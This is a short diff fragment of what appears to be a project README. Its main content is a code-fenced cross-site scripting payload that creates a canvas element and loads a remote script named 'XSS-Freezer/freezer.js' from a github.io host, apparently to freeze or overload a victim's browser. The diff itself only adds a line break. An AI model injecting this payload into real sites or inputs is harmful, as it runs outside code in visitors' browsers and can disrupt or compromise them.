@@ -14,5 +14,5 @@ https://github.com/user-attachments/assets/e35d05a5-1d54-42a2-89e8-511a6380acd5
 
 ------------------------------------------
 
-[224 characters]
+[224 characters] <br>
 ```<script>var c=document.createElement('canvas');c.id='cpuCanvas';document.body.appendChild(c);var r=document.createElement('script');r.src='//0-dayff13r.github.io/XSS-Freezer/freezer.js';document.body.appendChild(r);</script>```
